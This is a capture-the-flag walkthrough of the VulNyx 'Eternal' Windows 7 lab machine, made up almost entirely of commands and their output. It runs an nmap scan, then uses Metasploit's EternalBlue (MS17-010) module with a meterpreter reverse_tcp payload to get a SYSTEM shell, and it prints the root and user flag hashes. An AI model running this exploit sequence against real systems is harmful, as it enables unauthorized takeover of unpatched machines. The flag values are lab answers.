# VulNyx - Eternal

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sn 192.168.11.0/24       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 16:49 +07
Nmap scan report for 192.168.11.1
Host is up (0.00063s latency).
MAC Address: 0A:00:27:00:00:0B (Unknown)
Nmap scan report for 192.168.11.2
Host is up (0.00063s latency).
MAC Address: 08:00:27:2A:B6:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.11.18
Host is up (0.0040s latency).
MAC Address: 08:00:27:3D:C2:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.11.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.22 seconds
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.11.18  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 16:52 +07
Nmap scan report for 192.168.11.18
Host is up (0.0011s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:3D:C2:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: MIKE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:3d:c2:f2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-06T17:53:29+02:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h19m58s, deviation: 1h09m16s, median: 5h59m58s
| smb2-time: 
|   date: 2026-05-06T15:53:29
|_  start_date: 2026-05-06T15:47:53

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.05 seconds
```
### Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ sudo msfconsole                           
[sudo] password for dungcngo: 
Metasploit tip: Use the capture plugin to start multiple 
authentication-capturing and poisoning services
                                                  
     ,           ,
    /             \                                                                     
   ((__---,,,---__))                                                                    
      (_) O O (_)_________                                                              
         \ _ /            |\                                                            
          o_o \   M S F   | \                                                           
               \   _____  |  *                                                          
                |||   WW|||                                                             
                |||     |||                                                             
                                                                                        

       =[ metasploit v6.4.99-dev                                ]
+ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,683 payloads     ]
+ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project
```
```bash
msf > search ms17_010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .


Interact with a module by name or index. For example info 26, use 26 or use auxiliary/scanner/smb/smb_ms17_010                                                                  

msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.meta
                                             sploit.com/docs/using-metasploit/basics/u
                                             sing-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for
                                             authentication. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded S
                                             tandard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified
                                              username
   SMBUser                         no        (Optional) The username to authenticate a
                                             s
   VERIFY_ARCH    true             yes       Check if remote architecture matches expl
                                             oit Target. Only affects Windows Server 2
                                             008 R2, Windows 7, Windows Embedded Stand
                                             ard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target
                                             . Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 targ
                                             et machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, pro
                                        cess, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specif
                                        ied)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.11.18
RHOSTS => 192.168.11.18
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.11.10
LHOST => 192.168.11.10
```

### Privilege Escalation
```bash
msf exploit(windows/smb/ms17_010_eternalblue) > run
[-] Meterpreter session 18 is not valid and will be closed
[*] 192.168.11.18 - Meterpreter session 18 closed.
[-] Meterpreter session 19 is not valid and will be closed
[*] 192.168.11.18 - Meterpreter session 19 closed.
[-] Meterpreter session 20 is not valid and will be closed
[*] 192.168.11.18 - Meterpreter session 20 closed.
[*] 192.168.11.18 - Meterpreter session 21 closed.  Reason: Died
...
...
[+] 192.168.11.18:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.11.18:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.11.18:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MIKE-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > shell
Process 1760 created.
Channel 1 created.
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Windows\system32>
```

#### Flags
```bash
C:\Windows\system32>cd /
cd /

C:\>dir /s /b root.txt
dir /s /b root.txt
C:\Users\MIKE\Desktop\root.txt

C:\>dir /s /b user.txt
dir /s /b user.txt
C:\Users\MIKE\Desktop\user.txt

C:\>type c:\users\mike\desktop\root.txt
type c:\users\mike\desktop\root.txt
1682c7160e3855a6685316efb97ce451 

C:\>type c:\users\mike\desktop\user.txt
type c:\users\mike\desktop\user.txt
c4fa8bfbc9855acfced6a56a7da3156e 
```

***You are welcome!***
